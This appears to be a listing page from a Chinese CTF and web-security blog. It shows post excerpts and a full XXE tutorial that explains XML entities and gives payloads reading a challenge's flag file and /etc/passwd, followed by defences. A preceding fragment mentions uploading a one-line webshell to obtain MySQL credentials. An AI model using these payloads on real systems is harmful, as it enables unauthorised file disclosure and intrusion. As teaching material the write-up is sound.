<p>抓包修改，上传一句话，在config.php中得到mysql账号</p>
<p>登陆mysql获取flag表中的flag值</p>
<p><code>flag{00e0fb52-6f65-486c-ab4a-4e8b39344940}</code></p>
<h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/07/24/command-excu/">shell中的正则和通配符&amp;&amp;命令执行漏洞</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-07-24</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/命令执行/">命令执行</a></span><div class="content"><blockquote>
<p>代码执行漏洞是调用系统命令的漏洞，命令执行漏洞则是直接调用系统命令</p>
</blockquote></div><a class="more" href="/2018/07/24/command-excu/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/06/16/k15_hash/">Hash拓展攻击（hash length extension attacks）</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-06-16</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Hash拓展攻击/">Hash拓展攻击</a></span><div class="content"><p>遇到一个不一样的hash拓展攻击</p></div><a class="more" href="/2018/06/16/k15_hash/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/06/16/masscan/">Masscan 快速的IP端口扫描器</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-06-16</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/tool/">tool</a></span><div class="content"><blockquote>
<p>masscan的发包速度非常快，在windows中，它的发包速度可以达到每秒30万包；在Linux中，速度可以达到每秒160万。masscan在扫描时会随机选择目标IP，所以不会对远程的主机造成压力。</p>
</blockquote></div><a class="more" href="/2018/06/16/masscan/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/06/10/k14-xxe/">XML External Entity attack/XXE攻击</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-06-10</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/xxe/">xxe</a></span><div class="content"><a id="more"></a>
<h4 id="XML外部实体注入-XML-External-Entity"><a href="#XML外部实体注入-XML-External-Entity" class="headerlink" title="XML外部实体注入(XML External Entity)"></a>XML外部实体注入(XML External Entity)</h4><blockquote>
<p>XML 指可扩展标记语言（eXtensible Markup Language）</p>
</blockquote>
<blockquote>
<p>XML 被设计用来传输和存储数据。</p>
</blockquote>
<blockquote>
<p>HTML 被设计用来显示数据。</p>
</blockquote>
<h4 id="xml文档结构"><a href="#xml文档结构" class="headerlink" title="xml文档结构"></a>xml文档结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML声明--&gt; </span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!--文档类型定义--&gt; </span><br><span class="line">&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt; </span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt; </span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为”#PCDATA”类型--&gt; </span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为”#PCDATA”类型--&gt; </span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为”#PCDATA”类型--&gt; </span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为”#PCDATA”类型--&gt; ]]]&gt; &lt;!--文档元素--&gt; </span><br><span class="line">&lt;note&gt; </span><br><span class="line">&lt;to&gt;Dave&lt;/to&gt; </span><br><span class="line">&lt;from&gt;Tom&lt;/from&gt; </span><br><span class="line">&lt;head&gt;Reminder&lt;/head&gt; </span><br><span class="line">&lt;body&gt;You are a good man&lt;/body&gt; </span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
<p>其中包括XML声明、DTD文档类型定义（可选）、文档元素</p>
<ul>
<li>DTD(Document Type Definition）<ul>
<li>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</li>
</ul>
</li>
</ul>
<blockquote>
<ul>
<li>内部声明DTD<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>引用外部DTD<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code>或者<code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code></li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>内部声明实体<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>引用外部实体<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>或者<code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>参数实体<code>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;</code>或者<code>&lt;!ENTITY % 实体名称 &quot;URI&quot;&gt;</code></li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>注意：参数实体是在DTD中被引用的，而其余实体是在xml文档中被引用的</li>
</ul>
</blockquote>
<p>不同程序支持的协议</p>
<table>
<thead>
<tr>
<th>libxml2</th>
<th>PHP</th>
<th>Java</th>
<th>.NET</th>
</tr>
</thead>
<tbody>
<tr>
<td>file</td>
<td>file</td>
<td>file</td>
<td>file</td>
</tr>
<tr>
<td>http</td>
<td>http</td>
<td>http</td>
<td>http</td>
</tr>
<tr>
<td>ftp</td>
<td>ftp</td>
<td>ftp</td>
<td>ftp</td>
</tr>
<tr>
<td></td>
<td>php</td>
<td>https</td>
<td>https</td>
</tr>
<tr>
<td></td>
<td>compress.zlib</td>
<td>jar      </td>
</tr>
<tr>
<td></td>
<td>compress.bzip2</td>
<td>netdoc</td>
</tr>
<tr>
<td></td>
<td>data</td>
<td>mailto </td>
</tr>
<tr>
<td></td>
<td>glob</td>
<td>gopher      </td>
</tr>
<tr>
<td></td>
<td>phar</td>
</tr>
</tbody>
</table>
<p>包含内部实体的XML文档：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;!DOCTYPE entity [</span><br><span class="line">  &lt;!ENTITY copyright &quot;Copyright wiki.wooyun.org&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"> </span><br><span class="line">&lt;wooyun&gt;</span><br><span class="line">  &lt;internal&gt;&amp;copyright;&lt;/internal&gt;</span><br><span class="line">&lt;/wooyun&gt;</span><br></pre></td></tr></table></figure>
<p>包含外部实体的XML文档：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;!DOCTYPE entity [</span><br><span class="line">  &lt;!ENTITY wiki SYSTEM &quot;http://wiki.wooyun.org/&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"> </span><br><span class="line">&lt;wooyun&gt;</span><br><span class="line">  &lt;external&gt;&amp;wiki;&lt;/external&gt;</span><br><span class="line">&lt;/wooyun&gt;</span><br></pre></td></tr></table></figure>
<p>一些仅使用JSON去访问服务的客户端， 可能接受XML作为输入内容，这是可以修改Content-Type为xml看是否解析发送的内容</p>
<p>比如发送内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [&lt;!ENTITY test2 &quot;test3&quot;&gt;]&gt;</span><br><span class="line">&lt;t&gt;&amp;test2;&lt;/t&gt;</span><br></pre></td></tr></table></figure>
<p>意思大概是我们定义了一个名为test2的，值为test3的实体<code>&lt;t&gt;&amp;test2;&lt;/t&gt;</code>将实体呈现出来</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d9ce6098d0.png" alt="clip_5.png"></p>
<p>只要稍加修改便可以访问系统上本地文件或是远程系统上的文件</p>
<p>如<code>&lt;!ENTITY test2 &quot;test3&quot;&gt;</code>改为<code>&lt;!ENTITY test2 SYSTEM &quot;file:///home/test3.txt&quot;&gt;</code>，便可读取<code>/home/test3.txt</code>文件</p>
<p>以一道题为例</p>
<h4 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h4><p>设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
<p>题目入口：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a></p>
<p>抓包可看到传输的json数据</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d9ce60b27e.png" alt="clip_6.png"></p>
<p>将Content-Type: application/json改为Content-Type: application/xml并传输xml格式的数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE flag [ &lt;!ENTITY abc SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;flag&gt;&amp;abc;&lt;/flag&gt;</span><br></pre></td></tr></table></figure>
<p>读取flag</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d9ce60e06b.png" alt="clip_7.png"></p>
<p>也可以读取<code>/etc/passwd</code></p>
<p><img src="https://i.loli.net/2018/07/29/5b5d9ce60ca14.png" alt="clip_8.png"></p>
<h4 id="xxe防御"><a href="#xxe防御" class="headerlink" title="xxe防御"></a>xxe防御</h4><ol>
<li>使用开发语言提供的禁用外部实体的方法</li>
</ol>
<p>PHP：</p>
<p><code>libxml_disable_entity_loader(true);</code></p>
<p>JAVA:</p>
<p><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</code></p>
<p><code>dbf.setExpandEntityReferences(false);</code></p>
<p>Python：</p>
<p><code>from lxml import etree</code></p>
<p><code>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></p>
<ol start="2">
<li>过滤用户提交的XML数据</li>
</ol>
<p>关键词：<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>，或者，<code>SYSTEM</code>和<code>PUBLIC</code></p>
<p>参考：</p>
<p><a href="https://www.cnblogs.com/tongwen/p/5194483.html" target="_blank" rel="noopener">XML External Entity attack/XXE攻击 </a></p>
<p><a href="http://www.freebuf.com/articles/web/126788.html" target="_blank" rel="noopener">浅谈XXE攻击</a></p>
<p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">未知攻焉知防——XXE漏洞攻防</a></p>
<p><a href="https://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="noopener">XXE漏洞以及Blind XXE总结</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/05/01/iscc-wp/">ISCC-2018-WriteUp</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-05-01</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/WriteUp/">WriteUp</a></span><div class="content"><h3 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h3><p>很明显的暗示</p>
<p>改变图片的高度就行</p></div><a class="more" href="/2018/05/01/iscc-wp/#more">阅读更多</a><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2019/03/17/5c8e54b412bc5.png)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2019 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>